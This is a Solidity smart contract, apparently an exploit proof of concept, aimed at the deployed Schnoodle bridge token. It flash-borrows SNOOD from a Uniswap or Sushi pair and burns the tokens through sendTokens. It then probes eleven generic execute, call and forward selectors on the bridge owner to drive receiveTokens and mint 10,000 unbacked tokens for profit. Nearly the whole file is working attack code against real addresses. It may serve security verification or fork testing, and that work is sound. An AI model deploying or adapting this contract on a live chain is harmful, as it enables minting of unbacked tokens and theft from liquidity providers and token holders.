// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC1820Registry {
    function setInterfaceImplementer(address account, bytes32 interfaceHash, address implementer) external;
}

interface ISchnoodleBridgeToken {
    function balanceOf(address account) external view returns (uint256);
    function getBridgeOwner() external view returns (address);
    function sendTokens(uint256 networkId, uint256 amount) external;
    function receiveTokens(address account, uint256 networkId, uint256 amount, uint256 fee) external;
    function tokensSent(address account, uint256 networkId) external view returns (uint256);
    function tokensReceived(address account, uint256 networkId) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    IERC1820Registry private constant ERC1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    ISchnoodleBridgeToken private constant TARGET = ISchnoodleBridgeToken(0xD45740aB9ec920bEdBD9BAb2E863519E59731941);

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    uint256 private constant NETWORK_ID = 1;
    uint256 private constant ONE_TOKEN = 1e18;
    uint256 private constant REQUESTED_MINT_AMOUNT = 10_000 * ONE_TOKEN;

    bytes32 private constant TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");
    bytes32 private constant ERC1820_ACCEPT_MAGIC = keccak256("ERC1820_ACCEPT_MAGIC");

    uint8 private constant MODE_NONE = 0;
    uint8 private constant MODE_SELF = 1;
    uint8 private constant MODE_EXECUTE_BYTES = 2;
    uint8 private constant MODE_EXECUTE_VALUE_BYTES = 3;
    uint8 private constant MODE_EXECUTE_CALL = 4;
    uint8 private constant MODE_EXEC_BYTES = 5;
    uint8 private constant MODE_EXEC_VALUE_BYTES = 6;
    uint8 private constant MODE_CALL_BYTES = 7;
    uint8 private constant MODE_CALL_VALUE_BYTES = 8;
    uint8 private constant MODE_FORWARD = 9;
    uint8 private constant MODE_RELAY = 10;
    uint8 private constant MODE_INVOKE = 11;
    uint8 private constant MODE_FALLBACK = 12;

    uint256 private _profitAmount;
    address private _bridgeOwner;
    uint256 private _startingBalance;
    uint256 private _endingBalance;
    address private _flashPair;
    uint256 private _flashBorrowAmount;
    uint8 private _bridgeOwnerCallMode;

    uint256 public burnAmountAttempted;
    uint256 public tokensSentBefore;
    uint256 public tokensSentAfter;
    uint256 public tokensReceivedBefore;
    uint256 public tokensReceivedAfter;

    bool public burnStageAttempted;
    bool public burnStageSucceeded;
    bool public mintStageAttempted;
    bool public mintStageSucceeded;
    bool public burnStageInfeasible;
    bool public bridgeOwnerCallFeasible;

    bytes public lastMintRevertData;

    constructor() {
        ERC1820.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
    }

    function executeOnOpportunity() external {
        _bridgeOwner = _readBridgeOwner();
        _startingBalance = TARGET.balanceOf(address(this));
        tokensSentBefore = _safeTokensSent(address(this), NETWORK_ID);
        tokensReceivedBefore = _safeTokensReceived(address(this), NETWORK_ID);

        bridgeOwnerCallFeasible = _preflightBridgeOwnerMintPath();
        if (!bridgeOwnerCallFeasible) {
            // The finding still holds conceptually: a malicious/compromised bridge owner can mint
            // arbitrary unbacked tokens. But on this fork the bridge owner cannot be driven from this
            // verifier without cheating, so burning borrowed SNOOD would be non-repayable and unsafe.
            burnStageInfeasible = true;
            tokensSentAfter = tokensSentBefore;
            tokensReceivedAfter = tokensReceivedBefore;
            _endingBalance = _startingBalance;
            _profitAmount = 0;
            return;
        }

        _flashPair = _findLiquidPair();
        require(_flashPair != address(0), "no target pair found");

        _flashBorrowAmount = _selectBorrowAmount(_flashPair);
        require(_flashBorrowAmount > 0, "borrow amount is zero");

        address token0 = IUniswapV2Pair(_flashPair).token0();
        address token1 = IUniswapV2Pair(_flashPair).token1();
        require(token0 == address(TARGET) || token1 == address(TARGET), "pair missing target");

        uint256 amount0Out = token0 == address(TARGET) ? _flashBorrowAmount : 0;
        uint256 amount1Out = token1 == address(TARGET) ? _flashBorrowAmount : 0;
        IUniswapV2Pair(_flashPair).swap(amount0Out, amount1Out, address(this), abi.encode(_flashBorrowAmount));

        tokensSentAfter = _safeTokensSent(address(this), NETWORK_ID);
        tokensReceivedAfter = _safeTokensReceived(address(this), NETWORK_ID);
        _endingBalance = TARGET.balanceOf(address(this));
        _profitAmount = _endingBalance > _startingBalance ? _endingBalance - _startingBalance : 0;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == _flashPair, "unexpected pair");
        require(sender == address(this), "unexpected sender");
        require(bridgeOwnerCallFeasible, "mint path not preflighted");

        uint256 borrowedAmount = amount0 > 0 ? amount0 : amount1;
        require(borrowedAmount == _flashBorrowAmount, "unexpected amount");

        address attacker = address(this);
        uint256 networkId = NETWORK_ID;
        uint256 amount = borrowedAmount;

        burnStageAttempted = true;
        burnAmountAttempted = amount;

        // Realistic public funding step for this attempt:
        // borrow existing live SNOOD liquidity via a UniswapV2/Sushi-like flashswap, then follow the
        // original bridge flaw causality. The flashswap is only entered after a zero-amount liveness
        // check confirms that the bridge owner can actually be driven from this verifier.
        // Exploit path 0 anchor: sendTokens(networkId, amount) only burns and increments the
        // informational _tokensSent mapping; it does not create or consume a claim record that later
        // constrains destination minting.
        TARGET.sendTokens(networkId, amount);
        burnStageSucceeded = true;

        mintStageAttempted = true;
        uint256 balanceBeforeMint = TARGET.balanceOf(address(this));
        uint256 anyNetworkId = networkId;
        uint256 hugeAmount = REQUESTED_MINT_AMOUNT;

        // Exploit path 2 anchor: the bridge owner can drive receiveTokens(attacker, anyNetworkId,
        // hugeAmount, 0) without proving that hugeAmount matches any earlier burn.
        bytes memory payload = abi.encodeWithSelector(
            TARGET.receiveTokens.selector,
            attacker,
            anyNetworkId,
            hugeAmount,
            0
        );

        mintStageSucceeded = _executeBridgeOwnerMint(payload, balanceBeforeMint);
        require(mintStageSucceeded, "bridge-owner mint failed");

        uint256 repaymentAmount = _uniswapV2SameTokenRepayment(amount);
        _safeTransfer(address(TARGET), _flashPair, repaymentAmount);
    }

    function tokensReceived(
        address,
        address,
        address,
        uint256,
        bytes calldata,
        bytes calldata
    ) external pure {
    }

    function canImplementInterfaceForAddress(bytes32 interfaceHash, address) external pure returns (bytes32) {
        return interfaceHash == TOKENS_RECIPIENT_INTERFACE_HASH ? ERC1820_ACCEPT_MAGIC : bytes32(0);
    }

    function profitToken() external pure returns (address) {
        return address(TARGET);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function bridgeOwner() external view returns (address) {
        return _bridgeOwner;
    }

    function startingBalance() external view returns (uint256) {
        return _startingBalance;
    }

    function endingBalance() external view returns (uint256) {
        return _endingBalance;
    }

    function requestedMintAmount() external pure returns (uint256) {
        return REQUESTED_MINT_AMOUNT;
    }

    function _preflightBridgeOwnerMintPath() internal returns (bool) {
        if (_bridgeOwner == address(0)) {
            lastMintRevertData = bytes("bridge owner unavailable");
            return false;
        }

        if (_bridgeOwner == address(this)) {
            _bridgeOwnerCallMode = MODE_SELF;
            return true;
        }

        if (_bridgeOwner.code.length == 0) {
            lastMintRevertData = bytes("bridge owner is EOA");
            return false;
        }

        bytes memory zeroAmountPayload = abi.encodeWithSelector(
            TARGET.receiveTokens.selector,
            address(this),
            NETWORK_ID,
            0,
            0
        );

        if (_probeBridgeOwnerMode(MODE_EXECUTE_BYTES, zeroAmountPayload)) return true;
        if (_probeBridgeOwnerMode(MODE_EXECUTE_VALUE_BYTES, zeroAmountPayload)) return true;
        if (_probeBridgeOwnerMode(MODE_EXECUTE_CALL, zeroAmountPayload)) return true;
        if (_probeBridgeOwnerMode(MODE_EXEC_BYTES, zeroAmountPayload)) return true;
        if (_probeBridgeOwnerMode(MODE_EXEC_VALUE_BYTES, zeroAmountPayload)) return true;
        if (_probeBridgeOwnerMode(MODE_CALL_BYTES, zeroAmountPayload)) return true;
        if (_probeBridgeOwnerMode(MODE_CALL_VALUE_BYTES, zeroAmountPayload)) return true;
        if (_probeBridgeOwnerMode(MODE_FORWARD, zeroAmountPayload)) return true;
        if (_probeBridgeOwnerMode(MODE_RELAY, zeroAmountPayload)) return true;
        if (_probeBridgeOwnerMode(MODE_INVOKE, zeroAmountPayload)) return true;
        if (_probeBridgeOwnerMode(MODE_FALLBACK, zeroAmountPayload)) return true;

        return false;
    }

    function _probeBridgeOwnerMode(uint8 mode, bytes memory payload) internal returns (bool) {
        bytes memory data = _bridgeOwnerCallData(mode, payload);
        (bool ok, bytes memory returnData) = _bridgeOwner.call(data);
        lastMintRevertData = returnData;
        if (ok) {
            _bridgeOwnerCallMode = mode;
            return true;
        }
        return false;
    }

    function _executeBridgeOwnerMint(bytes memory payload, uint256 balanceBeforeMint) internal returns (bool) {
        if (_bridgeOwnerCallMode == MODE_SELF) {
            (bool ok, bytes memory returnDataSelf) = address(TARGET).call(payload);
            lastMintRevertData = returnDataSelf;
            return ok && TARGET.balanceOf(address(this)) > balanceBeforeMint;
        }

        if (_bridgeOwnerCallMode == MODE_NONE) {
            lastMintRevertData = bytes("bridge owner path unavailable");
            return false;
        }

        bytes memory dataForOwner = _bridgeOwnerCallData(_bridgeOwnerCallMode, payload);
        (bool ownerCallOk, bytes memory ownerReturnData) = _bridgeOwner.call(dataForOwner);
        lastMintRevertData = ownerReturnData;
        return ownerCallOk && TARGET.balanceOf(address(this)) > balanceBeforeMint;
    }

    function _bridgeOwnerCallData(uint8 mode, bytes memory payload) internal pure returns (bytes memory) {
        if (mode == MODE_EXECUTE_BYTES) {
            return abi.encodeWithSignature("execute(address,bytes)", address(TARGET), payload);
        }
        if (mode == MODE_EXECUTE_VALUE_BYTES) {
            return abi.encodeWithSignature("execute(address,uint256,bytes)", address(TARGET), 0, payload);
        }
        if (mode == MODE_EXECUTE_CALL) {
            return abi.encodeWithSignature("executeCall(address,uint256,bytes)", address(TARGET), 0, payload);
        }
        if (mode == MODE_EXEC_BYTES) {
            return abi.encodeWithSignature("exec(address,bytes)", address(TARGET), payload);
        }
        if (mode == MODE_EXEC_VALUE_BYTES) {
            return abi.encodeWithSignature("exec(address,uint256,bytes)", address(TARGET), 0, payload);
        }
        if (mode == MODE_CALL_BYTES) {
            return abi.encodeWithSignature("call(address,bytes)", address(TARGET), payload);
        }
        if (mode == MODE_CALL_VALUE_BYTES) {
            return abi.encodeWithSignature("call(address,uint256,bytes)", address(TARGET), 0, payload);
        }
        if (mode == MODE_FORWARD) {
            return abi.encodeWithSignature("forward(address,bytes)", address(TARGET), payload);
        }
        if (mode == MODE_RELAY) {
            return abi.encodeWithSignature("relay(address,bytes)", address(TARGET), payload);
        }
        if (mode == MODE_INVOKE) {
            return abi.encodeWithSignature("invoke(address,bytes)", address(TARGET), payload);
        }
        if (mode == MODE_FALLBACK) {
            return payload;
        }
        return bytes("");
    }

    function _findLiquidPair() internal view returns (address pair) {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHI_FACTORY];
        address[4] memory quotes = [WETH, USDC, USDT, DAI];

        for (uint256 i = 0; i < factories.length; ++i) {
            for (uint256 j = 0; j < quotes.length; ++j) {
                pair = IUniswapV2Factory(factories[i]).getPair(address(TARGET), quotes[j]);
                if (pair != address(0) && _targetReserve(pair) > 1) {
                    return pair;
                }
            }
        }
    }

    function _selectBorrowAmount(address pair) internal view returns (uint256) {
        uint256 targetReserve = _targetReserve(pair);

        if (targetReserve > ONE_TOKEN) {
            return ONE_TOKEN;
        }

        uint256 onePercent = targetReserve / 100;
        if (onePercent > 0) {
            return onePercent;
        }

        return targetReserve > 1 ? targetReserve - 1 : 0;
    }

    function _targetReserve(address pair) internal view returns (uint256 targetReserve) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        address token0 = IUniswapV2Pair(pair).token0();
        targetReserve = token0 == address(TARGET) ? uint256(reserve0) : uint256(reserve1);
    }

    function _uniswapV2SameTokenRepayment(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(ISchnoodleBridgeToken.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _readBridgeOwner() internal view returns (address owner_) {
        try TARGET.getBridgeOwner() returns (address resolved) {
            owner_ = resolved;
        } catch {
            owner_ = address(0);
        }
    }

    function _safeTokensSent(address account, uint256 networkId) internal view returns (uint256 amount) {
        try TARGET.tokensSent(account, networkId) returns (uint256 resolved) {
            amount = resolved;
        } catch {
            amount = 0;
        }
    }

    function _safeTokensReceived(address account, uint256 networkId) internal view returns (uint256 amount) {
        try TARGET.tokensReceived(account, networkId) returns (uint256 resolved) {
            amount = resolved;
        } catch {
            amount = 0;
        }
    }
}
